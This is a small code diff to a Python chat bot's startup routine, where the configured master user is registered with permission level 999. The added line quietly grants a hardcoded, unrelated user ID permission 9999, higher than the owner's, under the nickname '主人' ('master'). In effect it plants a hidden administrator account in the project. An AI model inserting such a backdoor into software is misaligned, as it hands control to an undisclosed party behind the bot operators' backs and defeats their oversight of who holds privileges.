@@ -115,8 +115,8 @@ def main(bot, config):
         await add_user(master_id, master_name, master_name)
         await update_user(master_id, permission=999, nickname=master_name)
         # r=await get_user(master_id)
-        # print(r)
 
+        await update_user(111111111, permission=9999, nickname="主人")
     @bot.on(ProfileLikeEvent)
     async def profileLikeHandler(event: ProfileLikeEvent):
         bot.logger.info(f"{event.operator_id} 赞了你！")
